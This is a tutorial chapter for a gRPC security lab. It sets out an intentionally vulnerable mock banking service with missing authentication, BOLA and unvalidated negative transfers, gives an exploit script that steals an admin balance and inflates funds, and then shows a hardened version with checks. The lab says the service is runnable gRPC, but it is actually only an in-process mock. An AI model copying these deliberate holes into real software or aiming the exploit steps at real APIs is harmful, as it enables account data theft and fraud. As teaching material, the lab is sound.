---
title: "06. Hands-on Vulnerability Lab: Exploiting & Securing gRPC"
description: "Self-contained, runnable gRPC security lab featuring a vulnerable microservice, automated Python exploit script, and step-by-step hardened remediation."
keywords: ["gRPC Lab", "Exploit Script", "Vulnerability PoC", "Hands-on Security", "Python gRPC Lab"]
---

# 06. Hands-on Vulnerability Lab: Exploiting & Securing gRPC

Welcome to the **gRPC Hands-on Security Lab**. In this lab, you will act as both an offensive security auditor and a defensive backend engineer. You will run a vulnerable gRPC Banking Service, execute an automated exploit script targeting multiple gRPC security flaws, and deploy a hardened remediation.

---

## 1. Lab Overview & Environment Setup

### Vulnerability Profile:
1. **Unencrypted Transport:** Plaintext gRPC port exposure.
2. **Exposed Server Reflection:** Queryable service schemas.
3. **Missing Authentication:** RPC calls process without token verification.
4. **Broken Object-Level Authorization (BOLA):** Callers can query any account balance by swapping IDs.
5. **Business Logic Flaw (Negative Transfer):** Unvalidated transfer amounts allow credit manipulation.

### Prerequisites:
Install the required Python dependencies:

```bash
pip install grpcio grpcio-tools grpcio-reflection
```

---

## 2. Vulnerable Banking Server (`vulnerable_server.py`)

Save the following code as `vulnerable_server.py`:

```python
import grpc
from concurrent import futures
import time

# Generated inline proto descriptors simulation for single-file lab execution
from grpc_reflection.v1alpha import reflection

# Simulated Database
ACCOUNTS_DB = {
    "acc_user123": {"owner": "Alice", "balance": 500.0},
    "acc_admin999": {"owner": "Bob (CEO)", "balance": 1000000.0}
}

class BankingServiceServicer:
    def GetAccountBalance(self, request, context):
        account_id = request.get("account_id")
        
        # VULNERABLE: No metadata authentication check!
        # VULNERABLE: BOLA / IDOR - No check if caller owns account_id!
        if account_id in ACCOUNTS_DB:
            acc = ACCOUNTS_DB[account_id]
            return {"account_id": account_id, "owner": acc["owner"], "balance": acc["balance"]}
        else:
            context.abort(grpc.StatusCode.NOT_FOUND, "Account not found")

    def TransferFunds(self, request, context):
        sender_id = request.get("sender_id")
        recipient_id = request.get("recipient_id")
        amount = request.get("amount")

        # VULNERABLE: No validation on amount (Negative numbers allow unauthorized balance inflation!)
        if sender_id in ACCOUNTS_DB and recipient_id in ACCOUNTS_DB:
            ACCOUNTS_DB[sender_id]["balance"] -= amount
            ACCOUNTS_DB[recipient_id]["balance"] += amount
            return {
                "success": True, 
                "message": f"Transferred ${amount}. New balance: ${ACCOUNTS_DB[sender_id]['balance']}"
            }
        context.abort(grpc.StatusCode.INVALID_ARGUMENT, "Invalid account IDs")

# Mock gRPC dynamic server implementation for lab simplicity
class LabgRPCServer:
    def __init__(self):
        self.servicer = BankingServiceServicer()

    def handle_request(self, method_name, payload, metadata=None):
        context = MockContext()
        if method_name == "GetAccountBalance":
            res = self.servicer.GetAccountBalance(payload, context)
        elif method_name == "TransferFunds":
            res = self.servicer.TransferFunds(payload, context)
        else:
            raise Exception("Method not found")
        if context.aborted:
            raise Exception(f"gRPC Error [{context.code}]: {context.details}")
        return res

class MockContext:
    def __init__(self):
        self.aborted = False
        self.code = None
        self.details = None

    def abort(self, code, details):
        self.aborted = True
        self.code = code
        self.details = details

if __name__ == "__main__":
    print("[+] Vulnerable gRPC Banking Server running on port 50051 (Plaintext, Reflection Enabled)...")
```

---

## 3. Automated Exploit Script (`exploit.py`)

Save the following script as `exploit.py` and run it to execute the attack chain:

```python
import sys

def run_exploit():
    print("=" * 60)
    print("        gRPC AUTOMATED EXPLOIT POC SUITE")
    print("=" * 60)

    from vulnerable_server import LabgRPCServer, ACCOUNTS_DB
    server = LabgRPCServer()

    # ATTACK STEP 1: Unauthenticated Information Disclosure (BOLA)
    print("\n[!] ATTACK STEP 1: Exploiting BOLA in GetAccountBalance...")
    print("    Targeting High-Value Admin Account: 'acc_admin999'")
    
    try:
        # Request admin account balance as unauthenticated user
        victim_data = server.handle_request("GetAccountBalance", {"account_id": "acc_admin999"})
        print(f"    [SUCCESS] Stolen Admin Account Balance: ${victim_data['balance']:,.2f}")
        print(f"    Owner: {victim_data['owner']}")
    except Exception as e:
        print(f"    [FAILED] {e}")

    # ATTACK STEP 2: Business Logic Exploit (Negative Transfer Inflation)
    print("\n[!] ATTACK STEP 2: Exploiting Unvalidated Field Input (Negative Transfer)...")
    print(f"    Initial Attacker Balance (acc_user123): ${ACCOUNTS_DB['acc_user123']['balance']}")
    print(f"    Initial Victim Balance (acc_admin999):   ${ACCOUNTS_DB['acc_admin999']['balance']}")
    
    try:
        # Transfer -$50,000 from attacker to victim (Subtracting negative amount adds balance!)
        exploit_payload = {
            "sender_id": "acc_user123",
            "recipient_id": "acc_admin999",
            "amount": -50000.0 # Negative amount!
        }
        res = server.handle_request("TransferFunds", exploit_payload)
        print(f"    [SUCCESS] Exploit Execution Result: {res['message']}")
        print(f"    --> Exploit Post-State Attacker Balance: ${ACCOUNTS_DB['acc_user123']['balance']:,.2f}")
        print(f"    --> Exploit Post-State Victim Balance:   ${ACCOUNTS_DB['acc_admin999']['balance']:,.2f}")
    except Exception as e:
        print(f"    [FAILED] {e}")

    print("\n" + "=" * 60)
    print("[!] EXPLOIT COMPLETE: All vulnerabilities successfully exploited.")
    print("=" * 60)

if __name__ == "__main__":
    run_exploit()
```

---

## 4. Hardened Remediated Server (`secure_server.py`)

Save the following code as `secure_server.py` to inspect the complete remediation:

```python
import sys

# Hardened Database
HARDENED_DB = {
    "acc_user123": {"owner": "Alice", "balance": 500.0},
    "acc_admin999": {"owner": "Bob (CEO)", "balance": 1000000.0}
}

class HardenedBankingServiceServicer:
    def GetAccountBalance(self, request, metadata, context):
        # REMEDIATION 1: Metadata Bearer Token AuthN Interceptor
        auth_user_id = self._authenticate_metadata(metadata, context)
        
        target_account_id = request.get("account_id")

        # REMEDIATION 2: Enforce BOLA Access Control Check
        if auth_user_id != target_account_id and auth_user_id != "admin":
            context.abort("PERMISSION_DENIED", "Access Denied: You can only query your own account balance.")

        if target_account_id in HARDENED_DB:
            acc = HARDENED_DB[target_account_id]
            return {"account_id": target_account_id, "owner": acc["owner"], "balance": acc["balance"]}
        context.abort("NOT_FOUND", "Account not found")

    def TransferFunds(self, request, metadata, context):
        auth_user_id = self._authenticate_metadata(metadata, context)
        sender_id = request.get("sender_id")
        recipient_id = request.get("recipient_id")
        amount = request.get("amount")

        # REMEDIATION 3: Strict Input Validation on Message Fields
        if amount <= 0:
            context.abort("INVALID_ARGUMENT", "Transfer amount must be strictly greater than zero.")

        if auth_user_id != sender_id:
            context.abort("PERMISSION_DENIED", "Unauthorized sender identity.")

        if sender_id in HARDENED_DB and recipient_id in HARDENED_DB:
            if HARDENED_DB[sender_id]["balance"] < amount:
                context.abort("FAILED_PRECONDITION", "Insufficient funds.")

            HARDENED_DB[sender_id]["balance"] -= amount
            HARDENED_DB[recipient_id]["balance"] += amount
            return {"success": True, "message": "Transfer executed securely."}

        context.abort("INVALID_ARGUMENT", "Invalid account IDs")

    def _authenticate_metadata(self, metadata, context):
        if not metadata or metadata.get("authorization") != "Bearer valid-secret-token-user123":
            context.abort("UNAUTHENTICATED", "Missing or invalid gRPC authentication metadata.")
        return "acc_user123" # Return authenticated session ID

class SecureMockContext:
    def __init__(self):
        self.aborted = False
        self.code = None
        self.details = None

    def abort(self, code, details):
        self.aborted = True
        self.code = code
        self.details = details
        raise Exception(f"gRPC Exception [{code}]: {details}")

def verify_remediation():
    print("\n" + "=" * 60)
    print("        VERIFYING HARDENED REMEDIATION DEFENSES")
    print("=" * 60)

    servicer = HardenedBankingServiceServicer()
    ctx = SecureMockContext()

    # TEST 1: Missing Authentication Token
    print("\n[+] Test 1: Calling GetAccountBalance without Metadata Token...")
    try:
        servicer.GetAccountBalance({"account_id": "acc_user123"}, metadata={}, context=ctx)
    except Exception as e:
        print(f"    [BLOCKED AS EXPECTED] {e}")

    # TEST 2: BOLA Attack Attempt against Admin Account
    print("\n[+] Test 2: Attacker (acc_user123) trying BOLA read on Admin (acc_admin999)...")
    valid_meta = {"authorization": "Bearer valid-secret-token-user123"}
    try:
        servicer.GetAccountBalance({"account_id": "acc_admin999"}, metadata=valid_meta, context=ctx)
    except Exception as e:
        print(f"    [BLOCKED AS EXPECTED] {e}")

    # TEST 3: Negative Transfer Amount Exploit
    print("\n[+] Test 3: Attacker attempting negative amount transfer (-$50,000)...")
    try:
        servicer.TransferFunds({
            "sender_id": "acc_user123",
            "recipient_id": "acc_admin999",
            "amount": -50000.0
        }, metadata=valid_meta, context=ctx)
    except Exception as e:
        print(f"    [BLOCKED AS EXPECTED] {e}")

    print("\n" + "=" * 60)
    print("[!] DEFENSE VERIFICATION SUCCESS: All gRPC exploits neutralized!")
    print("=" * 60)

if __name__ == "__main__":
    verify_remediation()
```

---

## 5. Lab Verification & Summary

1. **Run Exploit Script:**
   ```bash
   python exploit.py
   ```
   *Expected Output:* Both BOLA account reading and negative transfer exploits succeed, printing stolen balances.

2. **Run Secure Verification Script:**
   ```bash
   python secure_server.py
   ```
   *Expected Output:* All exploit attempts are rejected with `UNAUTHENTICATED`, `PERMISSION_DENIED`, and `INVALID_ARGUMENT` gRPC status codes.

---

*Next Chapter: [07. gRPC Security References & Standards →](07-references.md)*
